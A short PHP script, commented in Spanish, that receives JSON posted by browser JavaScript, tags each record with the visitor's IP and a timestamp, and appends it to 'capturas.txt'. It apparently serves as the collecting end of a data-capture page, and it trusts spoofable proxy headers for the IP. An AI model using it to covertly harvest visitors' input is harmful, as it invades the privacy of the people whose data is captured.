<?php
// Detectar IP real incluso detrás de proxy
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

$ip = obtenerIP();

$data = file_get_contents("php://input");
$payload = json_decode($data, true);

// Agregar IP y fecha a lo que envía JS
$registro = [
    "ip" => $ip,
    "time_server" => date("Y-m-d H:i:s"),
    "data" => $payload
];

file_put_contents("capturas.txt", json_encode($registro) . PHP_EOL, FILE_APPEND);

echo "ok";
?>
